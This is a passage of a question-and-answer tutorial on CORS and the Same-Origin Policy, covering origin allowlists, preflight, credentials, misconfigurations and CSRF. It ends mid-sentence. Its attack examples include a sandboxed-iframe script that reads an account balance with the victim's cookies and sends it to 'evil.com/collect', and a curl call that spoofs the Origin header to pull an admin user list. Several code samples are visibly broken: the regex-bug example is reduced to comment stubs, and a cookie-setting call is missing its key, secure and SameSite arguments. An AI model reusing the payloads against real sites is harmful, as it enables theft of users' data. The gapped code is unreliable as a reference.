## Section 1: The Same-Origin Policy and Why CORS Exists

**Q1. What is the Same-Origin Policy, and what exactly does it restrict?**
A: The Same-Origin Policy (SOP) is a browser security model that prevents JavaScript on one origin from reading responses from a different origin. It is the foundational browser security control that CORS exists to relax — selectively, under server control.

Two URLs share the same origin if and only if all three of **scheme**, **host**, and **port** are identical:

```
Base URL: https://app.myorg.com:443/dashboard

URL                                      Same origin?  Reason
───────────────────────────────────────  ────────────  ──────────────────────────
https://app.myorg.com/loans              YES           path differs, not part of origin
https://app.myorg.com:443/admin          YES           port 443 is default for https
http://app.myorg.com/loans               NO            scheme differs (http vs https)
https://api.myorg.com/loans              NO            host differs (app vs api)
https://app.myorg.com:8443/loans         NO            port differs (443 vs 8443)
https://myorg.com/loans                  NO            host differs (app.myorg.com vs myorg.com)
```

What SOP restricts:

```
Blocked by SOP (cross-origin reads from JavaScript):
  fetch("https://api.myorg.com/loans")                  ← response body blocked
  xhr.open("GET", "https://api.myorg.com/loans")        ← response blocked
  document read from a cross-origin iframe               ← contentDocument blocked
  localStorage / cookies of a different origin           ← blocked entirely

NOT blocked by SOP (cross-origin writes and embeds — these were always allowed):
  <img src="https://cdn.other.com/logo.png">            ← image loads (no JS read)
  <script src="https://cdn.other.com/lib.js">           ← script executes
  <link rel="stylesheet" href="https://...">            ← stylesheet loads
  <form action="https://bank.com/transfer" method="POST"> ← POST fires (CSRF!)
  window.location = "https://other.com"                 ← navigation allowed
```

The critical nuance: SOP blocks JavaScript from **reading** cross-origin responses. It does not block cross-origin **requests** from being sent. A `fetch()` to a cross-origin API fires the request — the server receives and processes it — but the browser blocks the JavaScript from reading the response. This distinction is why CSRF is a separate problem from CORS.

**Q2. What is CORS, and what is the precise mechanism by which it relaxes the SOP?**
A: Cross-Origin Resource Sharing (CORS, Fetch Living Standard) is a protocol by which a server declares which cross-origin clients are permitted to read its responses. The browser enforces this declaration — the server does not block the request; the browser blocks the JavaScript from reading the response if the server's declaration does not permit it.

The mechanism:

```
1. Browser makes a cross-origin request from JavaScript on origin A to server at origin B.

2. Browser automatically adds the Origin header to the request:
   Origin: https://app.myorg.com

3. Server at origin B processes the request and decides whether to allow cross-origin access.
   If yes, server responds with:
   Access-Control-Allow-Origin: https://app.myorg.com
   (or Access-Control-Allow-Origin: * for public APIs)

4. Browser inspects the response headers:
   - If ACAO matches the request's Origin → JavaScript can read the response.
   - If ACAO is absent or does not match → browser blocks JavaScript from reading the response.
     The request was already sent and processed — the block is on the READ, not the send.

Key insight: CORS is enforced by the browser, not the server.
  A curl command, Postman, or any non-browser client ignores CORS headers entirely.
  CORS is not an API security mechanism — it is a browser security mechanism.
  It prevents malicious websites from using a victim's browser to silently read
  your API responses. It does not prevent direct API calls from non-browser clients.
```

```
Without CORS (SOP only):
  Malicious site at evil.com runs:
    fetch("https://bank.com/api/account/balance")   ← request fires
    .then(r => r.json())                             ← browser blocks this read
    .then(data => exfiltrate(data))                  ← never reached

  The bank's server saw and processed the request. But evil.com's JS never got the data.

With CORS misconfiguration (bank echoes any Origin back):
  Bank server responds: Access-Control-Allow-Origin: https://evil.com
  Browser permits the read → evil.com's JS reads the account balance → data exfiltrated.
```

## Section 2: `Access-Control-Allow-Origin`

**Q3. What are the valid values for `Access-Control-Allow-Origin`, and when should each be used?**
A:

```
Value                                     Meaning
──────────────────────────────────────    ────────────────────────────────────────────
*                                         Any origin may read this response.
                                          Use only for truly public, unauthenticated APIs.
                                          CANNOT be used with credentials (cookies, auth headers).

https://app.myorg.com                     Only this exact origin may read the response.
                                          Use for APIs serving a specific frontend.

null                                      Allows the "null" origin (sandboxed iframes,
                                          file:// URLs, data: URLs).
                                          Almost never correct — see Q6 for the attack.
                                          Do not use in production.

(absent)                                  No cross-origin access. SOP applies.
                                          The safe default for internal APIs.
```

The wildcard `*` has a hard constraint: **it cannot be combined with `Access-Control-Allow-Credentials: true`**. The browser enforces this:

```javascript
// Browser behavior when credentials are involved:

// Server responds with:
//   Access-Control-Allow-Origin: *
//   Access-Control-Allow-Credentials: true

fetch("https://api.myorg.com/data", { credentials: "include" })
// Browser throws:
// The value of the 'Access-Control-Allow-Origin' header in the response must not be
// the wildcard '*' when the request's credentials mode is 'include'.
// → response is blocked even though ACAO is present.
```

**Q4. How do you correctly implement a dynamic origin allowlist — reflecting the request Origin only for approved origins?**
A: A single API often needs to serve multiple specific origins (production frontend, staging frontend, internal tooling). The correct pattern is an explicit allowlist — never a prefix match, substring match, or regex with unanchored patterns.

```python
# cors.py — safe dynamic origin reflection

ALLOWED_ORIGINS: frozenset[str] = frozenset({
    "https://app.myorg.com",
    "https://staging.myorg.com",
    "https://admin.myorg.com",
})

def get_cors_origin(request_origin: str | None) -> str | None:
    """
    Returns the origin to echo in Access-Control-Allow-Origin,
    or None if the origin is not in the allowlist.

    Rules:
    - Exact string match only (scheme + host + port, all must match)
    - Never substring match: "myorg.com" would match "evil-myorg.com"
    - Never prefix match: "https://myorg" would match "https://myorg.evil.com"
    - Never regex without anchors: re.search("myorg.com") matches "evilmyorgXcom"
    """
    if request_origin and request_origin in ALLOWED_ORIGINS:
        return request_origin
    return None


# FastAPI / Starlette middleware
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response

class CORSMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        request_origin = request.headers.get("origin")
        allowed_origin = get_cors_origin(request_origin)

        # Handle preflight (see Section 3)
        if request.method == "OPTIONS":
            return self._preflight_response(request, allowed_origin)

        response = await call_next(request)

        if allowed_origin:
            response.headers["Access-Control-Allow-Origin"]   = allowed_origin
            response.headers["Access-Control-Allow-Credentials"] = "true"
            # Vary: Origin — critical for caching correctness (see Q7)
            response.headers["Vary"] = "Origin"

        return response

    def _preflight_response(self, request: Request, allowed_origin: str | None) -> Response:
        if not allowed_origin:
            return Response(status_code=403)

        requested_method  = request.headers.get("Access-Control-Request-Method", "")
        requested_headers = request.headers.get("Access-Control-Request-Headers", "")

        return Response(
            status_code=204,
            headers={
                "Access-Control-Allow-Origin":      allowed_origin,
                "Access-Control-Allow-Methods":     _filter_methods(requested_method),
                "Access-Control-Allow-Headers":     _filter_headers(requested_headers),
                "Access-Control-Allow-Credentials": "true",
                "Access-Control-Max-Age":           "86400",    # 24h preflight cache
                "Vary":                             "Origin",
            },
        )


ALLOWED_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"}
ALLOWED_HEADERS = {
    "content-type", "authorization", "x-request-id",
    "x-correlation-id", "x-csrf-token",
}

def _filter_methods(requested: str) -> str:
    method = requested.strip().upper()
    return method if method in ALLOWED_METHODS else "GET"

def _filter_headers(requested: str) -> str:
    requested_set = {h.strip().lower() for h in requested.split(",")}
    allowed = requested_set & ALLOWED_HEADERS
    return ", ".join(allowed) if allowed else "content-type"
```

**Common misconfiguration — the regex anchor bug:**

# DANGEROUS: unanchored regex
import re

def is_allowed_origin_bad(origin: str) -> bool:
    # Intended: only myorg.com domains

# Attack:

                                                      # if written as "myorg.com")

# SAFE: exact set membership

**Q5. What is the `Vary: Origin` header, and why is it mandatory when reflecting dynamic origins?**
A: When a server reflects the request's `Origin` back in `Access-Control-Allow-Origin` (instead of using `*`), the response content is the same but the CORS header varies by origin. Without `Vary: Origin`, a CDN or shared cache can serve the wrong CORS header to a different origin.

```
Attack without Vary: Origin:

1. Request from https://app.myorg.com:
   → Origin: https://app.myorg.com
   → Server responds: Access-Control-Allow-Origin: https://app.myorg.com
   → CDN caches the response (without Vary: Origin, cache key = URL only)

2. Request from https://evil.com:
   → Origin: https://evil.com
   → CDN cache hit (same URL) → serves cached response with:
     Access-Control-Allow-Origin: https://app.myorg.com
   Wait — that's actually fine here, evil.com still can't read it.

3. Worse direction — the cache poisoning variant:
   If evil.com requests first and the server incorrectly echoes evil.com
   (due to a bug), that poisoned response is cached for all subsequent
   legitimate users of the same URL.

Correct: Vary: Origin tells caches that Origin is part of the cache key.
  Each origin gets its own cache entry.
  CDN stores separate copies keyed by (URL, Origin).
  No cross-origin cache poisoning possible.

Rule: whenever Access-Control-Allow-Origin is dynamically set (not hardcoded *),
always include Vary: Origin in the response.
```

```python
# Correct response headers when reflecting origins:
response.headers["Access-Control-Allow-Origin"]   = allowed_origin   # dynamic
response.headers["Vary"]                          = "Origin"         # always paired
response.headers["Access-Control-Allow-Credentials"] = "true"        # if credentials
```

**Q6. What is the `null` origin, and why is it dangerous to allowlist it?**
A: The `null` origin is sent by browsers in specific contexts: sandboxed iframes (`<iframe sandbox>`), `file://` pages, `data:` URLs, and certain redirects. Allowlisting `null` creates a trivially exploitable CORS bypass:

```html
<!-- Attack: force the null origin using a sandboxed iframe -->
<!-- Hosted on evil.com — no relationship to myorg.com required -->

<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://api.myorg.com/account/balance', {
      credentials: 'include'
    })
    .then(r => r.json())
    .then(data => {
      // Exfiltrate to attacker server
      fetch('https://evil.com/collect?data=' + JSON.stringify(data));
    });
  </script>
">
</iframe>

<!--
The iframe is sandboxed → its origin is "null"
The browser sends: Origin: null
If the server responds: Access-Control-Allow-Origin: null
The browser permits the read → account balance exfiltrated.
Any website on the internet can do this — no victim interaction beyond page load.
-->
```

```python
# NEVER do this:
if request_origin == "null" or request_origin in ALLOWED_ORIGINS:
    return request_origin   # null is not a safe origin to reflect

# The null origin cannot be meaningfully validated — you don't know which
# sandboxed iframe or file:// page it came from. Treat null as untrusted.
```

## Section 3: Preflight Requests

**Q7. What is a preflight request, and when does the browser send one?**
A: A preflight is an automatic `OPTIONS` request the browser sends before the actual request when the cross-origin request is not a "simple request." It asks the server: "are you willing to accept this method and these headers from this origin?" The actual request is only sent if the preflight succeeds.

The browser determines whether a preflight is required based on whether the request is a **simple request**. A request is simple if and only if all of the following hold:

```
Method is one of:    GET, HEAD, POST

Headers are only:    Accept
                     Accept-Language
                     Content-Language
                     Content-Type (with restrictions below)
                     Range (simple range values only)

Content-Type is:     application/x-www-form-urlencoded
                     multipart/form-data
                     text/plain

No:                  ReadableStream body
                     EventSource
                     XMLHttpRequestUpload event listeners
```

If any condition is violated, the browser sends a preflight. In practice, virtually every modern API call triggers a preflight because:
- `Authorization` header → not in the simple header list → preflight
- `Content-Type: application/json` → not in the allowed Content-Type list → preflight
- `PUT`, `PATCH`, `DELETE` → not in the simple method list → preflight

```
Simple request (no preflight):
  fetch("https://api.myorg.com/public/status")
  // GET, no custom headers → simple → browser sends request directly

Non-simple request (preflight required):
  fetch("https://api.myorg.com/loans", {
    method: "POST",
    headers: { "Content-Type": "application/json",    ← triggers preflight
               "Authorization": "Bearer eyJ..." },    ← triggers preflight
    body: JSON.stringify(payload),
  })

  Browser automatically sends first:
  OPTIONS https://api.myorg.com/loans HTTP/1.1
  Origin: https://app.myorg.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: content-type, authorization

  Server must respond with:
  HTTP/1.1 204 No Content
  Access-Control-Allow-Origin: https://app.myorg.com
  Access-Control-Allow-Methods: POST
  Access-Control-Allow-Headers: content-type, authorization
  Access-Control-Max-Age: 86400

  If preflight succeeds → browser sends the actual POST.
  If preflight fails (missing header, wrong origin) → actual request is never sent.
  Browser console shows: "CORS preflight response did not succeed"
```

**Q8. Walk through the complete preflight exchange — every request and response header, and what each does.**
A:

```
--- PREFLIGHT REQUEST (browser → server, automatic) ---

OPTIONS /api/loans/loan_789/approve HTTP/1.1
Host: api.myorg.com
Origin: https://app.myorg.com                          ← source origin
Access-Control-Request-Method: POST                    ← method the actual request will use
Access-Control-Request-Headers: content-type, authorization, x-request-id
                                                       ← headers the actual request will send
Connection: keep-alive


--- PREFLIGHT RESPONSE (server → browser) ---

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.myorg.com     ← which origin is permitted
                                                         must match request Origin exactly
                                                         (or * for public APIs without credentials)

Access-Control-Allow-Methods: POST, GET, OPTIONS       ← which methods are permitted
                                                         should include the requested method

Access-Control-Allow-Headers: content-type, authorization, x-request-id
                                                       ← which request headers are permitted
                                                         must include all headers in ACRH
                                                         case-insensitive

Access-Control-Allow-Credentials: true                 ← whether cookies/auth headers
                                                         may be included with credentials
                                                         (omit if not needed)

Access-Control-Max-Age: 86400                          ← how long (seconds) browser may
                                                         cache this preflight result
                                                         avoids a preflight on every request
                                                         Chrome max: 7200; Firefox max: 86400

Vary: Origin                                           ← required when ACAO is dynamic
Content-Length: 0


--- ACTUAL REQUEST (browser → server, sent only if preflight succeeded) ---

POST /api/loans/loan_789/approve HTTP/1.1
Host: api.myorg.com
Origin: https://app.myorg.com                         ← Origin still sent on actual request
Content-Type: application/json
Authorization: Bearer eyJhbGci...
X-Request-Id: req_8f2a91b3
Cookie: session=abc123                                ← sent because credentials: "include"

{"approved": true, "notes": "Within limit and policy"}


--- ACTUAL RESPONSE (server → browser) ---

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.myorg.com   ← must be on actual response too
Access-Control-Allow-Credentials: true                ← must be on actual response too
Vary: Origin
Content-Type: application/json

{"status": "approved", "loan_id": "loan_789"}
```

The most common preflight mistake: setting CORS headers only on the `OPTIONS` response and forgetting them on the actual response. The browser checks CORS headers on **both** the preflight and the actual response.

**Q9. How do you handle preflight caching with `Access-Control-Max-Age`, and what are the browser limits?**
A: Every preflight is an extra round-trip — an `OPTIONS` request before the actual request. `Access-Control-Max-Age` tells the browser how long it may cache the preflight result, avoiding the round-trip on subsequent requests from the same origin to the same URL.

```
Access-Control-Max-Age: 86400    ← cache preflight for 24 hours

Browser cache key: (origin, URL, method, headers)
  If a subsequent request from the same origin to the same URL
  uses the same method and a subset of the cached headers,
  the cached preflight result is used — no OPTIONS request sent.

Browser-enforced maximums (your server can request more, but browsers cap it):
  Chrome:  7,200 seconds (2 hours)
  Firefox: 86,400 seconds (24 hours)
  Safari:  600 seconds (10 minutes)   ← the practical ceiling if Safari support matters

Invalidation:
  The cache is per-browser-tab-session. Clearing browser cache invalidates it.
  A new browser session starts fresh (no preflight cache carried across sessions).
  Programmatic invalidation is not possible from the server — TTL only.

Practical recommendation:
  Set Access-Control-Max-Age: 7200 (Chrome's cap) for broad compatibility.
  For APIs with frequent permission changes (dynamic CORS), use a shorter value
  (300–600 seconds) so that allowlist changes propagate quickly.
  For stable public APIs, use the maximum to minimize preflight overhead.

What is NOT cached:
  The preflight cache does not cache the actual response — only the permission decision.
  Each actual request still hits the server; only the OPTIONS handshake is cached.
```

```python
# Preflight response with correct caching

def preflight_response(allowed_origin: str) -> Response:
    return Response(
        status_code=204,
        headers={
            "Access-Control-Allow-Origin":      allowed_origin,
            "Access-Control-Allow-Methods":     "GET, POST, PUT, PATCH, DELETE, OPTIONS",
            "Access-Control-Allow-Headers":     "content-type, authorization, x-request-id",
            "Access-Control-Allow-Credentials": "true",
            "Access-Control-Max-Age":           "7200",   # 2h — Chrome's effective max
            "Vary":                             "Origin",
            "Content-Length":                   "0",
        },
    )
```

**Q10. What headers does the browser expose to JavaScript in a cross-origin response, and how do you expose additional ones?**
A: By default, the browser exposes only a **CORS-safelisted** subset of response headers to JavaScript in cross-origin responses, regardless of what the server sends. To expose additional headers, the server must declare them explicitly.

```
CORS-safelisted response headers (always readable by JS, no declaration needed):
  Cache-Control
  Content-Language
  Content-Length
  Content-Type
  Expires
  Last-Modified
  Pragma

Non-safelisted headers (blocked by browser unless explicitly exposed):
  X-Request-Id          ← common correlation header
  X-RateLimit-Limit     ← pagination / rate limit info
  X-RateLimit-Remaining
  X-Total-Count         ← common for paginated list APIs
  ETag                  ← for conditional requests
  Location              ← for 201 Created redirects
  Authorization         ← (never expose this in ACAO-Expose-Headers)
  Set-Cookie            ← controlled by cookie flags, not this header

To expose additional headers:
  Access-Control-Expose-Headers: x-request-id, x-ratelimit-limit, x-total-count

  The browser will then allow JavaScript to read these headers:
  fetch("https://api.myorg.com/loans")
    .then(response => {
        const requestId = response.headers.get("x-request-id");  ← now readable
        const total     = response.headers.get("x-total-count"); ← now readable
    });
```

```python
# Server: expose pagination and tracing headers to cross-origin JS

response.headers["Access-Control-Allow-Origin"]    = allowed_origin
response.headers["Access-Control-Expose-Headers"]  = (
    "x-request-id, x-ratelimit-limit, x-ratelimit-remaining, "
    "x-total-count, x-page, x-per-page"
)
response.headers["Vary"] = "Origin"
```

## Section 4: Credentials

**Q11. What does `credentials: "include"` do, and what server-side headers are required to support it?**
A: By default, cross-origin `fetch()` and `XMLHttpRequest` do not send cookies, HTTP authentication headers, or TLS client certificates. Setting `credentials: "include"` (or `withCredentials: true` for XHR) causes the browser to attach these credentials to the cross-origin request — subject to server permission.

```javascript
// Three credential modes for fetch():

// 1. "omit" — never send credentials (even if same-origin)
fetch("https://api.myorg.com/loans", { credentials: "omit" })

// 2. "same-origin" (DEFAULT) — send credentials only if same origin
fetch("https://api.myorg.com/loans")                            // default
fetch("https://api.myorg.com/loans", { credentials: "same-origin" })

// 3. "include" — always send credentials, including cross-origin
fetch("https://api.myorg.com/loans", { credentials: "include" })
// → browser attaches: cookies, Authorization headers (if set), TLS client certs
// → browser requires: ACAO ≠ *, ACAC = true (on both preflight and actual response)
```

Server-side requirements for credentialed cross-origin requests — **all three must hold**:

```
Requirement 1: Access-Control-Allow-Origin must be a specific origin (not *)
  ✓  Access-Control-Allow-Origin: https://app.myorg.com
  ✗  Access-Control-Allow-Origin: *    ← browser rejects with error

Requirement 2: Access-Control-Allow-Credentials: true on both preflight and actual response
  ✓  Access-Control-Allow-Credentials: true
  ✗  (header absent)                   ← browser blocks JS from reading the response

Requirement 3: Cookies must have correct attributes to be sent cross-site
  SameSite=None; Secure                ← required for cookies to be sent cross-origin
  SameSite=Lax  or  SameSite=Strict   ← cookie will NOT be sent on cross-origin request

If any of the three conditions fails, the browser blocks the response — credentials mode
causes the browser to be MORE restrictive, not less.
```

```python
# Server-side: correct headers for credentialed cross-origin requests

def apply_cors_headers(response: Response, allowed_origin: str) -> None:
    """Apply CORS headers for credentialed cross-origin requests."""
    # Must be specific origin — never "*" with credentials
    response.headers["Access-Control-Allow-Origin"]      = allowed_origin
    # Must be "true" (string, not boolean) — both preflight and actual response
    response.headers["Access-Control-Allow-Credentials"] = "true"
    # Cache key must include Origin to avoid serving wrong CORS to cached responses
    response.headers["Vary"]                             = "Origin"
```

```python
# Setting the session cookie correctly for cross-origin credentialed requests

response.set_cookie(

    value=session_token,
    httponly=True,        # not readable by JavaScript

    domain="myorg.com",   # optional: share across subdomains

# SameSite=None without Secure is rejected by modern browsers.
# SameSite=Lax (default in modern browsers) blocks cookies on cross-origin POST,
# PUT, DELETE — the cookie will simply not be attached to the request,
# CORS configuration notwithstanding.
```

**Q12. How do cookies interact with CORS — specifically SameSite, the cookie domain, and third-party cookie deprecation?**
A:

```
Three layers that all must permit for a cookie to be sent on a cross-origin request:

Layer 1 — SameSite attribute (cookie-level):
  SameSite=None; Secure   → cookie sent on ALL cross-origin requests (if browser permits)
  SameSite=Lax            → cookie sent only on top-level navigation GETs (not fetch/XHR)
  SameSite=Strict         → cookie NEVER sent cross-origin

  If SameSite != None, the cookie is not sent on cross-origin fetch — CORS headers
  are irrelevant because the cookie never reaches the server.

Layer 2 — CORS headers (request-level):
  credentials: "include" on the client + ACAO + ACAC on the server.
  Even with SameSite=None, if CORS headers are wrong, browser blocks the response.

Layer 3 — Third-party cookie deprecation (browser policy):
  Chrome deprecated third-party cookies in 2024 (Tracking Protection).
  Even with SameSite=None; Secure, cookies from a different registrable domain
  may be blocked in Chrome for users who have enabled Tracking Protection.

  "Third-party" in cookie terms = different registrable domain (eTLD+1):
    app.myorg.com → api.myorg.com     ← SAME registrable domain (myorg.com) → not third-party
    app.myorg.com → api.otherorg.com  ← DIFFERENT registrable domain → third-party

Practical pattern for SaaS with same registrable domain:
  Frontend: app.myorg.com
  API:      api.myorg.com
  → cookies are first-party (same eTLD+1 = myorg.com)
  → SameSite=None not needed — SameSite=Lax works with subdomain sharing
  → Not affected by third-party cookie deprecation

Practical pattern for SaaS with different domains:
  Frontend: app.myorg.com
  API:      api.third-party-service.com
  → cookies are third-party → blocked in Chrome Tracking Protection
  → Mitigation: use Authorization: Bearer token instead of cookies
  → Or: use the Backend-for-Frontend pattern (frontend's own server proxies to API)
```

## Section 5: Security — Misconfigurations and Attacks

**Q13. What are the most dangerous CORS misconfigurations, and what can an attacker do with each?**
A:

**Misconfiguration 1 — Reflecting any Origin without validation:**

```python
# DANGEROUS: echo back whatever Origin the client sends
origin = request.headers.get("origin", "")
response.headers["Access-Control-Allow-Origin"] = origin         # ← any origin allowed
response.headers["Access-Control-Allow-Credentials"] = "true"    # ← with credentials!

# Attack: any website can read any authenticated API response for any user
# who visits the attacker's page while logged in.

# evil.com runs:
fetch("https://api.myorg.com/account/balance", { credentials: "include" })
  .then(r => r.json())
  .then(data => exfiltrate(data))
# → victim's balance is read because their session cookie is sent and CORS permits it.
```

**Misconfiguration 2 — Trusting the Origin header for access control decisions:**

```python
# DANGEROUS: using Origin as a security boundary inside the application
def is_internal_request(request):
    return request.headers.get("origin") == "https://internal-admin.myorg.com"

@router.get("/api/admin/all-users")
def list_all_users(request):
    if is_internal_request(request):
        return User.all()   # ← wrong: Origin is a browser-set header, not proof of identity
    raise HTTP403()

# The Origin header is set by the browser for cross-origin requests.
# For same-origin requests or non-browser clients, Origin may be absent.
# A server-to-server curl call can set Origin to any value:
#   curl -H "Origin: https://internal-admin.myorg.com" https://api.myorg.com/admin/all-users
# → returns all users.

# Origin is browser-enforced, not tamper-proof. Never use it for authorization.
# Use authentication (JWT, session token, mTLS) for access control.
```

**Misconfiguration 3 — Overly broad subdomain wildcarding:**

```python
# DANGEROUS: allowing all subdomains of a domain
import re

def is_allowed(origin):
    return bool(re.match(r"https://.*\.myorg\.com$", origin))

# Attack vector: subdomain takeover
# If an attacker takes over unused-subdomain.myorg.com (via dangling DNS, expired S3 bucket,
# unclaimed Heroku/GitHub Pages subdomain), they get a fully trusted CORS origin.
# They host a malicious page at https://taken-over.myorg.com → CORS allows it.

# Safer: explicit allowlist of approved subdomains (not wildcard matching)
ALLOWED_ORIGINS = frozenset({
    "https://app.myorg.com",
    "https://admin.myorg.com",
    "https://staging.myorg.com",
})
```

**Misconfiguration 4 — CORS on internal-only endpoints:**

```python
# DANGEROUS: applying permissive CORS to endpoints that should only be called server-side

@router.get("/internal/health-detailed")    # called by monitoring — not browsers
@router.get("/api/admin/audit-log")         # called only from internal admin panel
def handler(): ...

# If an external attacker can reach these endpoints AND they have overly permissive
# CORS, they can be called from a malicious page.

# Correct: internal endpoints should either:
# a) Not be exposed at the network boundary (internal VPC only)
# b) Have no CORS headers (SOP blocks cross-origin access — this is the safe default)
# c) Require client certificate (mTLS) — cannot be replayed from a browser
```

**Misconfiguration 5 — Forgetting CORS headers on error responses:**

```python
# DANGEROUS: CORS headers on 200 responses only

@router.post("/api/loans")
async def create_loan(request):
    try:
        loan = await Loan.create(...)
        response = JSONResponse(loan.dict())
        response.headers["Access-Control-Allow-Origin"] = allowed_origin
        return response
    except ValidationError as e:
        # 422 response — CORS headers NOT added ← browser blocks this
        return JSONResponse({"error": str(e)}, status_code=422)

# The browser blocks the error response because CORS headers are missing.
# The client's JavaScript cannot read the error details — poor DX and confusing errors.
# Correct: apply CORS headers in middleware so ALL responses (2xx, 4xx, 5xx) get them.
```

**Q14. How does CORS relate to CSRF — are they solving the same problem?**
A: CORS and CSRF are frequently confused because both involve cross-origin requests, but they protect against entirely different attacks and operate through different mechanisms.

```
CSRF (Cross-Site Request Forgery):
  The attack: a malicious page causes a victim's browser to send a state-changing
  request to a site where the victim is authenticated. The attacker does not need
  to read the response — they just need the request to be processed.

  Example:
  <img src="https://bank.com/transfer?to=attacker&amount=10000">
  → browser sends GET with the victim's bank cookies → transfer executes
  → attacker doesn't read any response — just needs the side effect

CORS:
  The protection: prevents JavaScript on a malicious page from READING
  cross-origin responses. It does not prevent cross-origin requests from being sent.

  CORS does NOT protect against CSRF because:
  1. Simple requests (forms, images, some GETs) are not preflighted — they fire.
  2. Even preflighted requests — the preflight may be denied, but the server
     already received the OPTIONS — the issue is the actual POST never fires
     if preflight fails, which is an improvement but not full CSRF protection.
  3. Non-browser clients ignore CORS entirely.

Where CORS helps with CSRF (partially):
  If an endpoint requires a non-simple request (e.g., Content-Type: application/json
  or a custom header like X-CSRF-Token), a cross-origin form cannot send it without
  a successful preflight. If the preflight is denied, the actual request never fires.
  This is the "CORS as CSRF mitigation for JSON APIs" pattern — but it is fragile:
  it breaks if the endpoint also accepts simple Content-Type values.

Where CSRF protection is still required:
  Any endpoint that accepts simple requests (form POST, GET with query params)
  must have its own CSRF protection: synchronizer token, Double-Submit cookie,
  SameSite=Lax/Strict cookie, or Origin header validation (note: different from
  trusting Origin for access control — checking Origin != null and Origin is in
  the allowlist as a CSRF check is acceptable because CSRF relies on sending
  requests, not reading responses).

The correct mental model:
  CORS  = "can this origin READ my response?"
  CSRF  = "can I prevent this origin from SENDING a state-changing request?"
  They are orthogonal. A site can have perfect CORS config and be CSRF-vulnerable.
  A site can have perfect CSRF protection and have a CORS misconfiguration.
```

## Section 6: Framework Implementations and Patterns

**Q15. How do you configure CORS correctly in common frameworks and when should you use a dedicated CORS library versus rolling your own?**
A:

```python
# FastAPI — using the built-in CORSMiddleware
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Option A: explicit allowlist (correct for authenticated APIs)
ALLOWED_ORIGINS = [
    "https://app.myorg.com",
    "https://staging.myorg.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,          # exact list — not ["*"] with credentials
    allow_credentials=True,                 # enables ACAC: true
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
    allow_headers=["Authorization", "Content-Type", "X-Request-Id"],
    max_age=7200,                           # preflight cache: 2 hours
    expose_headers=["X-Total-Count", "X-Request-Id"],
)

# Option B: public API without credentials — wildcard is safe
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,               # must be False with allow_origins=["*"]
    allow_methods=["GET"],
    allow_headers=["*"],
)
```

```javascript
// Express (Node.js) — using the 'cors' package

const express = require("express");
const cors    = require("cors");
const app     = express();

const ALLOWED_ORIGINS = new Set([
    "https://app.myorg.com",
    "https://staging.myorg.com",
]);

const corsOptions = {
    origin: (origin, callback) => {
        // Allow requests with no origin (server-to-server, curl, Postman)
        // and requests from the allowlist
        if (!origin || ALLOWED_ORIGINS.has(origin)) {
            callback(null, true);
        } else {
            callback(new Error(`CORS policy: origin ${origin} not allowed`));
        }
    },
    credentials: true,                     // Access-Control-Allow-Credentials: true
    methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization", "X-Request-Id"],
    exposedHeaders: ["X-Total-Count", "X-Request-Id"],
    maxAge: 7200,
};

app.use(cors(corsOptions));

// Explicitly handle OPTIONS for all routes (some frameworks need this)
app.options("*", cors(corsOptions));
```

```go
// Go — using the rs/cors package

package main

import (
    "net/http"
    "github.com/rs/cors"
)

func main() {
    mux := http.NewServeMux()
    // ... register handlers ...

    c := cors.New(cors.Options{
        AllowedOrigins:   []string{"https://app.myorg.com", "https://staging.myorg.com"},
        AllowCredentials: true,
        AllowedMethods:   []string{"GET", "POST", "PUT", "PATCH", "DELETE"},

    })

}
```

**When to roll your own vs. use a library:**

```
Use a CORS library (cors, FastAPI CORSMiddleware, Django-CORS-Headers):
  - Standard use cases: static allowlist, credentials flag, method/header allowlist
  - The library handles edge cases: method normalization, case-insensitive headers,
    Vary header, preflight OPTIONS handling, response header application on errors
  - Libraries are tested and widely reviewed — fewer implementation mistakes

Roll your own ONLY when:
  - Dynamic allowlist logic that can't be expressed in the library's origin callback
    (e.g., per-tenant origins stored in a database, validated at request time)
  - Need to integrate CORS with per-route policy (different allowlists per endpoint)
  - Performance-critical path: custom implementation can skip library overhead

If rolling your own, the checklist:
  □ Exact origin match (not substring, prefix, or unanchored regex)
  □ Vary: Origin on all dynamic ACAO responses
  □ CORS headers on ALL responses — 2xx, 4xx, 5xx, and OPTIONS
  □ Credentials: ACAO must not be * when ACAC is true
  □ Never reflect null origin
  □ OPTIONS handler returns 204 (not 200) with no body
  □ Max-Age set appropriately
  □ Exposed headers declared if non-safelisted headers are needed
  □ Access-Control-Allow-Headers echoes (filtered) the ACRH, case-insensitively
```

**Q16. How do you debug CORS errors — reading browser error messages and diagnosing the root cause?**
A:

```
Common browser error messages and their root causes:

Error: "Access to fetch at 'https://api.myorg.com/loans' from origin
        'https://app.myorg.com' has been blocked by CORS policy:
        No 'Access-Control-Allow-Origin' header is present on the requested resource."

  Cause: CORS headers missing entirely from the response.
  Check: did the server respond at all? (Network tab → see if request got a response)
         Is CORS middleware applied to this route/method?
         Does the 404/500 error response have CORS headers? (Often not.)


Error: "...has been blocked by CORS policy: The 'Access-Control-Allow-Origin'
        header has a value 'https://staging.myorg.com' that is not equal to
        the supplied origin."

  Cause: Origin allowlist doesn't include the requesting origin.
  Check: what Origin is the browser sending? (Network → request headers → Origin)
         Is that exact value in the server's allowlist?
         Is there a trailing slash, capitalization, or port difference?
         Is Vary: Origin set? Could a CDN be serving a cached response from another origin?


Error: "...blocked by CORS policy: Response to preflight request doesn't pass
        access control check: It does not have HTTP ok status."

  Cause: the OPTIONS preflight returned a non-2xx status (common: 401, 404, 405).
  Check: does the server have a route/handler for OPTIONS on this path?
         Is authentication middleware running before CORS middleware? (Wrong order:
         auth middleware rejects the unauthenticated OPTIONS request before CORS runs)
         Correct order: CORS middleware → Auth middleware → Route handler


Error: "...blocked by CORS policy: The value of the 'Access-Control-Allow-Origin'
